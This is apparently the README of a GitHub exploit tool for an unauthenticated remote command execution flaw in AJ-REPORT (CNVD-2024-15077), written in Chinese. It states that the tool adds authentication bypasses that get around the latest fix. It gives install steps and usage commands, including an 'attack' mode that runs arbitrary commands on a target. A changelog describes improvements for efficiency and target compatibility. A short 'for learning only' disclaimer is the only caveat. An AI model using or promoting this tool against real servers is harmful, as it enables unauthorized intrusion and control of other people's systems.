源代码来源：https://github.com/yuebusao/AJ-REPORT-EXPLOIT

仅用于学习，请勿用于非法用途

## AJ-REPORT-EXPLOIT
AJ-REPORT未授权远程命令执行CNVD-2024-15077利用工具，在原版基础上增加了新的鉴权绕过以及远程命令执行方式，可以绕过最新修复。

### 分析
见AJ-REPORT远程命令执行.md

### 使用
```
pip install -r requirements.txt
python exp.py -u attack_url -b bypass1 -m detect
```

### 注意事项
请点击登陆查看请求`url`确定后端接口。
如输入用户名密码点击登录后发现接口为`http://x.x.x.x/squirt1e/accessUser/login`。
则检测命令为
```
python exp.py -u http://x.x.x.x/squirt1e/ -b bypass1 -m detect
```

### 2025-0722 改进项
1. 自动检查baseUrl，不需要使用者手动探测，大幅提高了使用效率，传入 -u 参数需以根目录结尾，如: "http://1.2.3.4/", 而非 "http://1.2.3.4/index.html"
2. 增加了 -c 参数，可以指定命令行
3. payload中增加了自动检测系统环境的功能，自动切换cmd和sh
4. 解决SSL问题


```
python3 exp.py -u http://xxxx:xx/ -b bypass2 -m attack -c id
```
